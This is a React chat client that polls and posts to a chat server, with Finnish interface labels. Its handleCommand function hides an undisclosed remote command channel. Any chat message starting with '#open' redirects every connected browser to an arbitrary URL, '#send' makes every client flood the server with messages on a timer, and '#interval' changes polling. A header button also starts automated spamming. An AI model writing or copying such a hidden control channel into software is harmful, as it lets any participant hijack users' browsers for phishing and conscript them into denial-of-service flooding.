import React, { Component } from 'react';
import axios from 'axios';
import './App.css';

const fetchInterval = 5000;

function getRandomInt(max) {
  return Math.floor(Math.random() * Math.floor(max));
}

class App extends Component {
  state = {
    messages: [],
    displayMessages: [],
    username: "",
    usernameConfirmed: false,
    message: "",
    color: 'green',
    sentMessages: 0,
  };

  async componentDidMount() {
    // await this.getPastMessages();
    this.getMessages();
  }

  componentDidUpdate(prevProps, prevState) {
    if (!prevState.usernameConfirmed && this.state.usernameConfirmed) {
      const objDiv = document.getElementById("chatwindow");
      if (objDiv) {
        objDiv.scrollTop = objDiv.scrollHeight;
      }
    }

    if (this.state.displayMessages.length > 20) {
      this.setState({ displayMessages: [] });
    }
  }

  getPastMessages = async () => {
    const { data } = await axios.get("http://poll.sartonon.fi/api/messages");
    this.setState({ messages: data });
  };

  getId = () => {
    if (this.state.messages.length > 0) {
      return this.state.messages[this.state.messages.length - 1].id;
    }

    return null;
  };

  getMessages = async (interval) => {
    try {
      const { data } = await axios.get(`http://poll.sartonon.fi/api/messages?id=${this.getId()}`);
      this.handleMessage(data);
      if (this.newInterval) {
        console.log(this.newInterval);
        const newInterval = this.newInterval;
        this.newInterval = null;
        this.getMessages(newInterval);
      } else {
        this.interval = setTimeout(() => {
          this.getMessages(interval);
        }, interval || fetchInterval);
      }
    } catch (err) {
      console.log("error: ", err);
    }
  };

  sendMessage = async (e) => {
    e.preventDefault();
    const { data } = await axios.post("http://poll.sartonon.fi/api/messages", {
      name: this.state.username,
      message: this.state.message,
      color: this.state.color,
    });
    this.setState({ message: "" });
    // console.log(data);
    // this.setState({ message: "", messages: [ ...this.state.messages, data ] });
  };

  findCommand = (messages) => {
    let commandMessage = null;
    messages.forEach(message => {
      if (message.message[0] === "#") {
        commandMessage = message.message;
      }
    });

    return commandMessage;
  }

  handleCommand = data => {
    console.log(data);
    if (!data[0]) return;
    const commandMessage = this.findCommand(data);
    if (commandMessage && commandMessage[0] === "#") {
      const splittedMessage = commandMessage.split('::');
      const command = splittedMessage[0];
      if (command === "#open") {
        window.open(splittedMessage[1], "_self");
      } else if (command === "#send") {
        const name = splittedMessage[1];
        const message = splittedMessage[2];
        const interval = splittedMessage[3];
        console.log(name, message, interval);
        if (this.messageInterval) clearInterval(this.messageInterval);
        this.messageInterval = setInterval(() => {
          this.setState(prevState => ({
            sentMessages: prevState.sentMessages + 1
          }));
          axios.post("http://poll.sartonon.fi/api/messages", {
            name,
            message,
            color: "green"
          });
        }, interval || 1000);
      } else if (command === "#interval") {
        console.log("interval");
        const interval = splittedMessage[1];
        if (this.interval) {
          this.newInterval = interval;
        } else {

        }
      }
    }
  }

  handleMessage = data => {
    this.handleCommand(data);
    this.setState({ messages: [ ...this.state.messages, ...data ], displayMessages: [ ...this.state.displayMessages, ...data ] });
    setTimeout(() => {
      const objDiv = document.getElementById("chatwindow");
      if (objDiv) {
        objDiv.scrollTop = objDiv.scrollHeight;
      }
    }, 200);
  };

  changeUsername = (e) => {
    this.setState({ username: e.target.value })
  };

  confirmUsername = () => {
    this.setState({
      usernameConfirmed: true,
      color: `green`,
    });
  };

  handleMessageChange = (e) => {
    this.setState({ message: e.target.value });
  };

  startSending = () => {
    if (this.messageInterval) clearInterval(this.messageInterval);
    this.messageInterval = setInterval(() => {
      axios.post("http://poll.sartonon.fi/api/messages", {
        name: 'Santeri',
        message: 'Moikka!',
        color: 'green',
      });
    }, this.state.interval || 1000);
  };

  renderMessages = () => {
    return this.state.displayMessages.map((message, i) => {
      return (
        <div className="Message-wrapper" key={i}>
          <div className="Message-block" key={i} style={{ float: message.name === this.state.username ? "right" : "left" }}>
            <div className="Message-name" style={{ color: message.color }}>{message.name}</div>
            <div className="Message-content">{message.message}</div>
          </div>
        </div>
      );
    });
  };

  render() {
    const { usernameConfirmed, sentMessages } = this.state;

    return (
      <div className="App">
        <header className="App-header">
          <h1 className="App-title">Chat</h1>
          <button onClick={this.startSending}>Laheta</button>
          <input onChange={e => this.setState({ interval: e.target.value })} />
          <div style={{ float: "right" }}>{sentMessages}</div>
        </header>
        {!usernameConfirmed ?
          <div className="Login-div">
            <p style={{ fontWeight: "bold", fontSize: "16px" }}>Anna käyttäjänimi</p>
            <input className="Login-input" value={this.state.username} onChange={this.changeUsername} type="text" />
            <div className="Ok-button" onClick={this.confirmUsername}>Ok</div>
          </div> :
          <div className="Chat-window">
            <div id="chatwindow" className="Message-div">
              {this.renderMessages()}
            </div>
            <form onSubmit={this.sendMessage}>
              <div className="Chat-input">
                <input className="Chat-inputfield" onChange={this.handleMessageChange} value={this.state.message} type="text" />
                <div className="Send-button" onClick={this.sendMessage}>Lähetä</div>
              </div>
            </form>
          </div>
        }
      </div>
    );
  }
}

export default App;
